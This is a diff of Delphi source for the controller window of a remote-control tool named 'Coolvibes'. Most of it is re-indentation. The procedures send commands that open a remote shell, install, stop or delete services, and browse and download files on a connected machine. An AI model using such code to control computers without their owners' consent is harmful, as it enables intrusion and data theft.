-    Estado(_('Transferencia finalizada: ')+extractfilename(filename));
-  end;
-  if not Servidor.Terminated and Servidor.Connection.Connected then
-  begin
-    for i := 0 to ListViewDescargas.Items.Count - 1 do
+  if (AnsiLowerCase(extractfilename(FileName)) = 'thumbs.db') then
     begin
-      Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
-      if not Descarga.Transfering and not Descarga.cancelado and not
-        Descarga.Finalizado and Descarga.es_descarga then //en espera
-      begin
-        Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
-          '|' + IntToStr(Descarga.Descargado));
-        Exit;
-      end;
+      CargarThumbsFileAlListview(DirDescargas + 'thumbs.db'); //cargamos las miniaturas
+      Receivingthumbfile := False;
+    end
+  else
+    begin
+
+      Estado(_('Transferencia finalizada: ') + extractfilename(FileName));
     end;
-  end;
+  if not Servidor.Terminated and Servidor.Connection.Connected then
+    begin
+      for i := 0 to ListViewDescargas.Items.Count - 1 do
+        begin
+          Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
+          if not Descarga.Transfering and not Descarga.cancelado and not
+            Descarga.Finalizado and Descarga.es_descarga then //en espera
+            begin
+              Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
+                '|' + IntToStr(Descarga.Descargado));
+              Exit;
+            end;
+        end;
+    end;
 end;
 
 procedure TFormControl.ListViewDescargasContextPopup(Sender: TObject;
-  MousePos: TPoint; var Handled: boolean);
+  MousePos: TPoint; var Handled: Boolean);
 var
   Descarga: TDescargaHandler;
 begin
   if ListViewDescargas.Selected <> nil then
-  begin
-    Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
-    if Descarga.Transfering then
     begin
-      PopupDescargas.Items[0].Enabled := True;
+      Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
+      if Descarga.Transfering then
+        begin
+          PopupDescargas.Items[0].Enabled := True;
+          PopupDescargas.Items[1].Enabled := False;
+          PopupDescargas.Items[2].Enabled := False;
+          PopupDescargas.Items[3].Enabled := False;
+          PopupDescargas.Items[4].Enabled := False;
+          PopupDescargas.Items[5].Enabled := False;
+          PopupDescargas.Items[7].Enabled := False;
+          //Algún día conseguiremos que se pueda cancelar una descarga o subida
+        end
+      else if (not Descarga.Transfering) {AND (not Descarga.cancelado)} and
+      (not Descarga.Finalizado) then //en espera o cancelado
+        begin
+          PopupDescargas.Items[0].Enabled := False;
+          PopupDescargas.Items[1].Enabled := True;
+          PopupDescargas.Items[2].Enabled := True;
+          PopupDescargas.Items[3].Enabled := True;
+          PopupDescargas.Items[4].Enabled := True;
+          PopupDescargas.Items[5].Enabled := True;
+          PopupDescargas.Items[7].Enabled := True;
+        end
+      else if Descarga.Finalizado then
+        begin
+          PopupDescargas.Items[0].Enabled := False;
+          PopupDescargas.Items[1].Enabled := False;
+          PopupDescargas.Items[2].Enabled := True;
+          PopupDescargas.Items[3].Enabled := True;
+          PopupDescargas.Items[4].Enabled := True;
+          PopupDescargas.Items[5].Enabled := True;
+          PopupDescargas.Items[7].Enabled := True;
+        end;
+    end;
+  if (ListViewDescargas.Selected = nil) then
+    begin
+      PopupDescargas.Items[0].Enabled := False;
       PopupDescargas.Items[1].Enabled := False;
       PopupDescargas.Items[2].Enabled := False;
       PopupDescargas.Items[3].Enabled := False;
       PopupDescargas.Items[4].Enabled := False;
       PopupDescargas.Items[5].Enabled := False;
       PopupDescargas.Items[7].Enabled := False;
-      //Algún día conseguiremos que se pueda cancelar una descarga o subida
-    end
-    else if (not Descarga.Transfering) {AND (not Descarga.cancelado)} and
-      (not Descarga.Finalizado) then //en espera o cancelado
-    begin
-      PopupDescargas.Items[0].Enabled := False;
-      PopupDescargas.Items[1].Enabled := True;
-      PopupDescargas.Items[2].Enabled := True;
-      PopupDescargas.Items[3].Enabled := True;
-      PopupDescargas.Items[4].Enabled := True;
-      PopupDescargas.Items[5].Enabled := True;
-      PopupDescargas.Items[7].Enabled := True;
-    end
-    else if Descarga.Finalizado then
-    begin
-      PopupDescargas.Items[0].Enabled := False;
-      PopupDescargas.Items[1].Enabled := False;
-      PopupDescargas.Items[2].Enabled := True;
-      PopupDescargas.Items[3].Enabled := True;
-      PopupDescargas.Items[4].Enabled := True;
-      PopupDescargas.Items[5].Enabled := True;
-      PopupDescargas.Items[7].Enabled := True;
     end;
-  end;
-  if (ListViewDescargas.Selected = nil) then
-  begin
-    PopupDescargas.Items[0].Enabled := False;
-    PopupDescargas.Items[1].Enabled := False;
-    PopupDescargas.Items[2].Enabled := False;
-    PopupDescargas.Items[3].Enabled := False;
-    PopupDescargas.Items[4].Enabled := False;
-    PopupDescargas.Items[5].Enabled := False;
-    PopupDescargas.Items[7].Enabled := False;
-  end;
 
   //las subidas de archivo no se reanudan
   if not Descarga.es_descarga then
@@ -3070,251 +3101,254 @@ begin
 
 end;
 
-
 //Popup eliminar descarga
+
 procedure TFormControl.Eliminardescarga1Click(Sender: TObject);
 var
   Descarga: TDescargaHandler;
-  i, j:     integer;
-  TmpItem : Tlistitem;
+  i, j: Integer;
+  TmpItem: Tlistitem;
 begin
   mslistviewitem := ListViewDescargas.Selected;
 
   while Assigned(mslistviewitem) do
-  begin
-  if mslistviewitem.Data <> nil then
-  begin
-    if not TDescargaHandler(mslistviewitem.Data).Transfering then
     begin
-      TDescargaHandler(mslistviewitem.Data).Free;
-      i := mslistviewitem.Index;
-      tmpitem := mslistviewitem;
-      mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      tmpitem.Delete;
+      if mslistviewitem.Data <> nil then
+        begin
+          if not TDescargaHandler(mslistviewitem.Data).Transfering then
+            begin
+              TDescargaHandler(mslistviewitem.Data).Free;
+              i := mslistviewitem.Index;
+              tmpitem := mslistviewitem;
+              mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+              tmpitem.Delete;
+            end;
+        end;
     end;
-  end;
-  end;
 end;
 
 //Popup borrar completados
+
 procedure TFormControl.Borrarcompletados1Click(Sender: TObject);
 var
-  i, j:     integer;
+  i, j: Integer;
   Descarga: TDescargaHandler;
 begin
   {Lo recorremos en orden inverso sino al borrar el primer item, el resto se desplazaria hacia arriba y nos saldriamos del bucle}
   for i := ListViewDescargas.Items.Count - 1 downto 0 do
-  begin
-    Descarga := TDescargaHandler(ListViewDescargas.Items.Item[i].Data);
-    if Descarga.Finalizado then
-    begin  //Borrar el item descargado y subir todos hacia arriba
-     // Descarga.ProgressBar.Free;
-      ListViewDescargas.Items[i].Delete;
-      Descarga.Free;
-      //Mover los progressbar que halla por debajo hacia arriba
-      for j := i to ListViewDescargas.Items.Count - 1 do
-        //Si hay una progressbar subirla un puesto
-        if ListViewDescargas.Items.Item[j].Data <> nil then
-        begin
-          Descarga := TDescargaHandler(ListViewDescargas.Items.Item[j].Data);
-         { Descarga.ProgressBar.Top :=
-            Descarga.ProgressBar.Top - (Descarga.ProgressBar.BoundsRect.Bottom -
-            Descarga.ProgressBar.BoundsRect.Top); }
+    begin
+      Descarga := TDescargaHandler(ListViewDescargas.Items.Item[i].Data);
+      if Descarga.Finalizado then
+        begin //Borrar el item descargado y subir todos hacia arriba
+          // Descarga.ProgressBar.Free;
+          ListViewDescargas.Items[i].Delete;
+          Descarga.Free;
+          //Mover los progressbar que halla por debajo hacia arriba
+          for j := i to ListViewDescargas.Items.Count - 1 do
+            //Si hay una progressbar subirla un puesto
+            if ListViewDescargas.Items.Item[j].Data <> nil then
+              begin
+                Descarga := TDescargaHandler(ListViewDescargas.Items.Item[j].Data);
+                { Descarga.ProgressBar.Top :=
+                   Descarga.ProgressBar.Top - (Descarga.ProgressBar.BoundsRect.Bottom -
+                   Descarga.ProgressBar.BoundsRect.Top); }
+              end;
         end;
     end;
-  end;
 end;
 
 //Subir al primer puesto
+
 procedure TFormControl.Subiralprimerpuesto1Click(Sender: TObject);
 var
   Item: TListItem;
-  i, j: integer;
+  i, j: Integer;
 begin
   for i := 0 to ListViewDescargas.Items.Count - 1 do
     if ListViewDescargas.Items.Item[i].SubItems[0] = _('En espera') then
-    begin
-      if ListViewDescargas.ItemIndex = i then
-        Exit;  //Es el primer item en espera no se puede subir más
-      Item := TListItem.Create(ListViewDescargas.Items);
-      Item.Assign(ListViewDescargas.Selected);
-      for j := ListViewDescargas.Selected.Index downto i + 1 do
-        ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j - 1];
-      ListViewDescargas.Items.Item[i] := Item;
-      ListViewDescargas.ItemIndex := i;
-      Item.Free;
-      break;
-    end;
+      begin
+        if ListViewDescargas.ItemIndex = i then
+          Exit; //Es el primer item en espera no se puede subir más
+        Item := TListItem.Create(ListViewDescargas.Items);
+        Item.Assign(ListViewDescargas.Selected);
+        for j := ListViewDescargas.Selected.Index downto i + 1 do
+          ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j - 1];
+        ListViewDescargas.Items.Item[i] := Item;
+        ListViewDescargas.ItemIndex := i;
+        Item.Free;
+        break;
+      end;
 end;
 
 //Subir un puesto
+
 procedure TFormControl.Subir1Click(Sender: TObject);
 var
   Item: TListItem;
-  i:    integer;
+  i: Integer;
 begin
   if ListViewDescargas.ItemIndex = 0 then
-    exit;  //Si es el primero...
+    Exit; //Si es el primero...
   //Si su item superior está tambien en espera se intercambia con él
   i := ListViewDescargas.ItemIndex;
   if ListViewDescargas.Items.Item[i - 1].SubItems[0] = _('En espera') then
-  begin
-    Item := TListItem.Create(ListViewDescargas.Items);
-    Item.Assign(ListViewDescargas.Selected);
-    ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i - 1];
-    ListViewDescargas.Items.Item[i - 1] := Item;
-    ListViewDescargas.ItemIndex := i - 1;
-    Item.Free;
-  end;
+    begin
+      Item := TListItem.Create(ListViewDescargas.Items);
+      Item.Assign(ListViewDescargas.Selected);
+      ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i - 1];
+      ListViewDescargas.Items.Item[i - 1] := Item;
+      ListViewDescargas.ItemIndex := i - 1;
+      Item.Free;
+    end;
 end;
 
 //Bajar un puesto
+
 procedure TFormControl.Bajar1Click(Sender: TObject);
 var
   Item: TListItem;
-  i:    integer;
+  i: Integer;
 begin
   if ListViewDescargas.ItemIndex = ListViewDescargas.Items.Count - 1 then
-    exit;  //Si es el último...
+    Exit; //Si es el último...
   //Si su item inferior está tambien en espera se intercambia con él
   i := ListViewDescargas.ItemIndex;
   if ListViewDescargas.Items.Item[i + 1].SubItems[0] = _('En espera') then
-  begin
-    Item := TListItem.Create(ListViewDescargas.Items);
-    Item.Assign(ListViewDescargas.Selected);
-    ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i + 1];
-    ListViewDescargas.Items.Item[i + 1] := Item;
-    ListViewDescargas.ItemIndex := i + 1;
-    Item.Free;
-  end;
+    begin
+      Item := TListItem.Create(ListViewDescargas.Items);
+      Item.Assign(ListViewDescargas.Selected);
+      ListViewDescargas.Items.Item[i] := ListViewDescargas.Items.Item[i + 1];
+      ListViewDescargas.Items.Item[i + 1] := Item;
+      ListViewDescargas.ItemIndex := i + 1;
+      Item.Free;
+    end;
 end;
 
 //Bajar al ultimo puesto
+
 procedure TFormControl.ltimopuesto1Click(Sender: TObject);
 var
   Item: TListItem;
-  i, j: integer;
+  i, j: Integer;
 begin
   //Buscamos el último item en espera y le insertamos ahi
   for i := ListViewDescargas.Items.Count - 1 downto 0 do
     if ListViewDescargas.Items.Item[i].SubItems[0] = _('En espera') then
-    begin
-      if ListViewDescargas.ItemIndex = i then
-        Exit;  //Es el último item en espera no se puede bajar más
-      Item := TListItem.Create(ListViewDescargas.Items);
-      Item.Assign(ListViewDescargas.Selected);
-      for j := i + 1 to ListViewDescargas.Selected.Index do
-        ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j + 1];
-      ListViewDescargas.Items.Item[i] := Item;
-      ListViewDescargas.ItemIndex := i;
-      Item.Free;
-      break;
-    end;
+      begin
+        if ListViewDescargas.ItemIndex = i then
+          Exit; //Es el último item en espera no se puede bajar más
+        Item := TListItem.Create(ListViewDescargas.Items);
+        Item.Assign(ListViewDescargas.Selected);
+        for j := i + 1 to ListViewDescargas.Selected.Index do
+          ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j + 1];
+        ListViewDescargas.Items.Item[i] := Item;
+        ListViewDescargas.ItemIndex := i;
+        Item.Free;
+        break;
+      end;
 end;
 
 procedure TFormControl.Activar2Click(Sender: TObject);
 begin
-  MemoShell.lines.clear;
+  MemoShell.Lines.Clear;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('SHELL|ACTIVAR')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
-
 procedure TFormControl.ComboBoxShellCommandKeyPress(Sender: TObject; var Key: char);
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   if Key = #13 then
-  begin
-    if Lowercase(ComboBoxShellCommand.Text) = 'cls' then
-      MemoShell.Text := '';
-
-    Servidor.Connection.Writeln('SHELL|' + ComboBoxShellCommand.Text);
-
-    //Agrega el comando que acabo de escribir a la lista de comandos del combobox
-    if ComboBoxShellCommand.Items.Count > 0 then //inserta un item de primero en la lista
     begin
-      if ComboBoxShellCommand.Text <> ComboBoxShellCommand.Items[0] then
-        ComboBoxShellCommand.Items.Insert(0, ComboBoxShellCommand.Text);
-    end
-    else
-      ComboBoxShellCommand.Items.Add(ComboBoxShellCommand.Text);
-    //limpiar comando
-    ComboBoxShellCommand.Text := '';
-  end;
+      if Lowercase(ComboBoxShellCommand.Text) = 'cls' then
+        MemoShell.Text := '';
+
+      Servidor.Connection.Writeln('SHELL|' + ComboBoxShellCommand.Text);
+
+      //Agrega el comando que acabo de escribir a la lista de comandos del combobox
+      if ComboBoxShellCommand.Items.Count > 0 then //inserta un item de primero en la lista
+        begin
+          if ComboBoxShellCommand.Text <> ComboBoxShellCommand.Items[0] then
+            ComboBoxShellCommand.Items.Insert(0, ComboBoxShellCommand.Text);
+        end
+      else
+        ComboBoxShellCommand.Items.Add(ComboBoxShellCommand.Text);
+      //limpiar comando
+      ComboBoxShellCommand.Text := '';
+    end;
 end;
 
 procedure TFormControl.BtnCambiarFuenteShellClick(Sender: TObject);
 begin
   if DlgFont.Execute then
-  begin
-    MemoShell.Font := DlgFont.Font;
-    ComboBoxShellCommand.Font := DlgFont.Font;
-    if MemoShell.Color = MemoShell.Font.Color then
-      MessageBoxw(Handle,
-        Pwidechar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
-        Pwidechar(_('Advertencia')), 0 + MB_IconWarning);
-  end;
+    begin
+      MemoShell.Font := DlgFont.Font;
+      ComboBoxShellCommand.Font := DlgFont.Font;
+      if MemoShell.Color = MemoShell.Font.Color then
+        MessageBoxw(Handle,
+          Pwidechar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
+          Pwidechar(_('Advertencia')), 0 + MB_IconWarning);
+    end;
 end;
 
 procedure TFormControl.BtnCambiarColorShellClick(Sender: TObject);
 begin
   if DlgColors.Execute then
-  begin
-    MemoShell.Color := DlgColors.Color;
-    ComboBoxShellCommand.Color := DlgColors.Color;
-    if MemoShell.Color = MemoShell.Font.Color then
-      MessageBoxw(Handle,
-        PWidechar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
-        PWidechar(_('Advertencia')), 0 + MB_IconWarning);
-  end;
+    begin
+      MemoShell.Color := DlgColors.Color;
+      ComboBoxShellCommand.Color := DlgColors.Color;
+      if MemoShell.Color = MemoShell.Font.Color then
+        MessageBoxw(Handle,
+          PWidechar(_('Se escogió el mismo color para la fuente y el fondo. Escoge otro.')),
+          PWidechar(_('Advertencia')), 0 + MB_IconWarning);
+    end;
 end;
 
 procedure TFormControl.PopupShellPopup(Sender: TObject);
 begin
-  Activar2.Enabled    := not ComboBoxShellCommand.Enabled;
+  Activar2.Enabled := not ComboBoxShellCommand.Enabled;
   Desactivar2.Enabled := ComboBoxShellCommand.Enabled;
 end;
 
 procedure TFormControl.Desactivar2Click(Sender: TObject);
 begin
-  ComboBoxShellCommand.enabled := false;
+  ComboBoxShellCommand.Enabled := False;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('SHELL|DESACTIVAR')
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
-
 procedure TFormControl.Guardarcmo1Click(Sender: TObject);
 begin
-  DlgGuardar.Title      := _('Guardar texto :: Coolvibes ::');
+  DlgGuardar.Title := _('Guardar texto :: Coolvibes ::');
   DlgGuardar.InitialDir := GetCurrentDir();
-  DlgGuardar.Filter     := _('Archivo de texto')+' (*.txt)|*.txt';
+  DlgGuardar.Filter := _('Archivo de texto') + ' (*.txt)|*.txt';
   DlgGuardar.DefaultExt := 'txt';
   if DlgGuardar.Execute then
-  begin
-    MemoShell.Lines.SaveToFile(DlgGuardar.FileName);
-    Estado(_('Archivo guardado como: ') + DlgGuardar.FileName);
-  end;
+    begin
+      MemoShell.Lines.SaveToFile(DlgGuardar.FileName);
+      Estado(_('Archivo guardado como: ') + DlgGuardar.FileName);
+    end;
 end;
 
 procedure TFormControl.BtnServiciosClick(Sender: TObject);
 begin
-  if not BtnServicios.enabled then exit;
-  BtnServicios.enabled := false;
-  ListviewServicios.enabled := false;
+  if not BtnServicios.Enabled then Exit;
+  BtnServicios.Enabled := False;
+  ListviewServicios.Enabled := False;
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
   ListViewServicios.Clear;
   Servidor.Connection.Writeln('LISTARSERVICIOS');
 end;
@@ -3322,49 +3356,49 @@ end;
 procedure TFormControl.DEtener1Click(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
-   mslistviewitem := ListViewServicios.Selected;
-   while Assigned(mslistviewitem) do
-   begin
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
+  mslistviewitem := ListViewServicios.Selected;
+  while Assigned(mslistviewitem) do
+    begin
       Servidor.Connection.Writeln('DETENERSERVICIO' + mslistviewitem.Caption);
       mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-   end;
+    end;
 end;
 
 procedure TFormControl.Iniciar1Click(Sender: TObject);
 begin
 
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
-   mslistviewitem := ListViewServicios.Selected;
-   while Assigned(mslistviewitem) do
-   begin
+  mslistviewitem := ListViewServicios.Selected;
+  while Assigned(mslistviewitem) do
+    begin
       Servidor.Connection.Writeln('INICIARSERVICIO' + mslistviewitem.Caption);
       mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-   end;
+    end;
 end;
 
 procedure TFormControl.Desinstalar1Click(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
-  
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
+
   mslistviewitem := ListViewServicios.Selected;
-   while Assigned(mslistviewitem) do
-   begin
+  while Assigned(mslistviewitem) do
+    begin
       Servidor.Connection.Writeln('BORRARSERVICIO' + mslistviewitem.Caption);
       mslistviewitem := ListViewServicios.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-   end;
+    end;
 end;
 
 procedure TFormControl.Instalar1Click(Sender: TObject);
@@ -3380,7 +3414,7 @@ begin
   btnSiguienteInstalarServicio.Visible := False;
   BtnCancelarInstalarServicio.Visible := False;
   MultiEditInstalarServicio.Visible := False;
-  btnInstServicios.Visible  := False;
+  btnInstServicios.Visible := False;
   btnInstServicios2.Visible := False;
 end;
 
@@ -3403,17 +3437,17 @@ end;
 procedure TFormControl.btnInstServicios2Click(Sender: TObject);
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
   RutaSI := MultiEditInstalarServicio.Text;
   Servidor.Connection.Writeln('INSTALARSERVICIO' + nombresi + '|' +
     descripcionSI + '|' + rutaSi + '|');
   btnSiguienteInstalarServicio.Visible := False;
   BtnCancelarInstalarServicio.Visible := False;
   MultiEditInstalarServicio.Visible := False;
-  btnInstServicios.Visible  := False;
+  btnInstServicios.Visible := False;
   btnInstServicios2.Visible := False;
 end;
 
@@ -3425,7 +3459,7 @@ begin
     Exit;
   if ListViewDescargas.Selected.Data = nil then
     Exit;
-    
+
   Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
   if not Descarga.Transfering then
     PopUpDescargas.Items[0].Enabled := False; //menu Detener descarga
@@ -3438,20 +3472,20 @@ procedure TFormControl.DetenerDescarga1Click(Sender: TObject);
 var
   Descarga: TDescargaHandler;
 begin
-   mslistviewitem := ListViewDescargas.Selected;
-   if mslistviewitem = nil then
+  mslistviewitem := ListViewDescargas.Selected;
+  if mslistviewitem = nil then
     Exit;
 
-   while Assigned(mslistviewitem) do
-   begin
+  while Assigned(mslistviewitem) do
+    begin
       if mslistviewitem.Data <> nil then
-      begin
-        Descarga := TDescargaHandler(mslistviewitem.Data);
-        if Descarga.Transfering then
-          Descarga.CancelarDescarga;
-      end;
+        begin
+          Descarga := TDescargaHandler(mslistviewitem.Data);
+          if Descarga.Transfering then
+            Descarga.CancelarDescarga;
+        end;
       mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-   end;
+    end;
 
 end;
 
@@ -3460,112 +3494,113 @@ var
   Descarga: TDescargaHandler;
 begin
   if not Servidor.Connection.Connected then
-  begin
-    MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
-    exit;
-  end;
+    begin
+      MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
+      Exit;
+    end;
 
   mslistviewitem := ListViewDescargas.Selected;
-   if mslistviewitem = nil then
+  if mslistviewitem = nil then
     Exit;
 
-   while Assigned(mslistviewitem) do
-   begin
+  while Assigned(mslistviewitem) do
+    begin
       if mslistviewitem.Data <> nil then
-      begin
-        Descarga := TDescargaHandler(mslistviewitem.Data);
-        if not Descarga.Transfering then
-          Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
-          '|' + IntToStr(Descarga.Descargado));
-      end;
+        begin
+          Descarga := TDescargaHandler(mslistviewitem.Data);
+          if not Descarga.Transfering then
+            Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
+              '|' + IntToStr(Descarga.Descargado));
+        end;
       mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-   end;
-
+    end;
 
 end;
 
 procedure TFormControl.Agregaracoladedescarga1Click(Sender: TObject);
 var
   Descarga: TDescargaHandler;
-  FilePath: ansistring;
-  Size:     integer;
+  FilePath: AnsiString;
+  Size: Integer;
 begin
-    if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-      mslistviewitem := ListViewArchivos.Selected
-    else
-      mslistviewitem := ListViewBuscar.Selected;
-      
-   if mslistviewitem = nil then Exit;
+  if PageControlArchivos.ActivePage = TabSheetVerArchivos then
+    mslistviewitem := ListViewArchivos.Selected
+  else
+    mslistviewitem := ListViewBuscar.Selected;
 
-   CrearDirectoriosUsuario();
-   while Assigned(mslistviewitem) do
-   begin
+  if mslistviewitem = nil then Exit;
+
+  CrearDirectoriosUsuario();
+  while Assigned(mslistviewitem) do
+    begin
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
-      begin
-        FilePath := EditPathArchivos.Text + mslistviewitem.Caption;
-        Size     := StrToInt(mslistviewitem.SubItems.Strings[4]);
-      end
+        begin
+          FilePath := EditPathArchivos.Text + mslistviewitem.Caption;
+          Size := StrToInt(mslistviewitem.SubItems.Strings[4]);
+        end
       else
-      begin
-        FilePath := mslistviewitem.subitems[0];
-        Size     := StrToInt(mslistviewitem.SubItems.Strings[5]);
-      end;
+        begin
+          FilePath := mslistviewitem.subitems[0];
+          Size := StrToInt(mslistviewitem.SubItems.Strings[5]);
+        end;
       Descarga := TDescargaHandler.Create(nil, FilePath, Size,
-      DirDescargas+ExtractFileName(FilePath), ListViewDescargas, True);
+        DirDescargas + ExtractFileName(FilePath), ListViewDescargas, True);
       Descarga.callback := Self.TransferFinishedNotification;
       if PageControlArchivos.ActivePage = TabSheetVerArchivos then
         mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
       else
         mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-   end;
+    end;
 end;
 
 procedure TFormControl.EditPathArchivosKeyPress(Sender: TObject; var Key: char);
 begin
   if (key = #13) then
-  begin
-    EditPathArchivos.Text := Trim(EditPathArchivos.Text);
-    Self.BtnActualizarArchivos.Click;
-  end;
+    begin
+      EditPathArchivos.Text := Trim(EditPathArchivos.Text);
+      Self.BtnActualizarArchivos.Click;
+    end;
 end;
 
 //El evento OnClick es igual para todos los listviews
+
 procedure TFormControl.ListViewProcesosColumnClick(Sender: TObject;
   Column: TListColumn);
 begin
   Columna := Column.Index;
   (Sender as TListView).AlphaSort;
-  if Columna <> ColumnaOrdenada then   //Para acordarnos por que columna está ordenado
+  if Columna <> ColumnaOrdenada then //Para acordarnos por que columna está ordenado
     ColumnaOrdenada := Columna
   else
     ColumnaOrdenada := -1;
 end;
 
 //Este evento lo comparten varios ListViews, aquellos que en la columna 0 y 2 sean cadenas y la 1 sea un numero
+
 procedure TFormControl.ListViewProcesosCompare(Sender: TObject;
-  Item1, Item2: TListItem; Data: integer; var Compare: integer);
+  Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
 var
   Str1, Str2: string;
 begin
-  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
-  begin
-    Str1 := Item1.Caption;
-    Str2 := Item2.Caption;
-  end
+  if Columna = 0 then //Si Columna = 0 usar Item.Caption
+    begin
+      Str1 := Item1.Caption;
+      Str2 := Item2.Caption;
+    end
   else
-  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
-    if Item1.SubItems.Count < Columna then
-      Str1 := ''
-    else
-      Str1 := Item1.SubItems[Columna - 1];
-    if Item2.SubItems.Count < Columna then
-      Str2 := ''
-    else
-      Str2 := Item2.SubItems[Columna - 1];
-  end;
-  if Columna in [0, 2] then  //Son tratadas como cadenas
+    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
+      if Item1.SubItems.Count < Columna then
+        Str1 := ''
+      else
+        Str1 := Item1.SubItems[Columna - 1];
+      if Item2.SubItems.Count < Columna then
+        Str2 := ''
+      else
+        Str2 := Item2.SubItems[Columna - 1];
+    end;
+  if Columna in [0, 2] then //Son tratadas como cadenas
     Compare := CompareText(Str1, Str2)
-  else  //Columna 1, PID
+  else //Columna 1, PID
     Compare := StrToIntDef(Str1, 0) - StrToIntDef(Str2, 0);
   //Si la columna ya fue ordenada anteriormente, invertir el orden
   if Columna = ColumnaOrdenada then
@@ -3574,65 +3609,67 @@ begin
 end;
 
 //Para el registro y los servicios las 3 columnas son cadenas
+
 procedure TFormControl.ListViewRegistroCompare(Sender: TObject;
-  Item1, Item2: TListItem; Data: integer; var Compare: integer);
+  Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
 var
   Str1, Str2: string;
 begin
-  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
-  begin
-    Str1 := Item1.Caption;
-    Str2 := Item2.Caption;
-  end
+  if Columna = 0 then //Si Columna = 0 usar Item.Caption
+    begin
+      Str1 := Item1.Caption;
+      Str2 := Item2.Caption;
+    end
   else
-  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
-    if Item1.SubItems.Count < Columna then
-      Str1 := ''
-    else
-      Str1 := Item1.SubItems[Columna - 1];
-    if Item2.SubItems.Count < Columna then
-      Str2 := ''
-    else
-      Str2 := Item2.SubItems[Columna - 1];
-  end;
+    begin //Si Columna > 0 usar Item.SubItems[Columna -1]
+      if Item1.SubItems.Count < Columna then
+        Str1 := ''
+      else
+        Str1 := Item1.SubItems[Columna - 1];
+      if Item2.SubItems.Count < Columna then
+        Str2 := ''
+      else
+        Str2 := Item2.SubItems[Columna - 1];
+    end;
   Compare := CompareText(Str1, Str2);
   if Columna = ColumnaOrdenada then
     Compare := Compare * -1;
 end;
 
 //Para ordenar ficheros
+
 procedure TFormControl.ListViewArchivosCompare(Sender: TObject;
-  Item1, Item2: TListItem; Data: integer; var Compare: integer);
+  Item1, Item2: TListItem; Data: Integer; var Compare: Integer);
 var
   Str1, Str2: string;
 begin
-  if Columna = 0 then  //Si Columna = 0 usar Item.Caption
-  begin
-    Str1 := Item1.Caption;
-    Str2 := Item2.Caption;
-  end
+  if Columna = 0 then //Si Columna = 0 usar Item.Caption
+    begin
+      Str1 := Item1.Caption;
+      Str2 := Item2.Caption;
+    end
   else
-  begin       //Si Columna > 0 usar Item.SubItems[Columna -1]
-    if Item1.SubItems.Count < Columna then
-      Str1 := ''
-    else
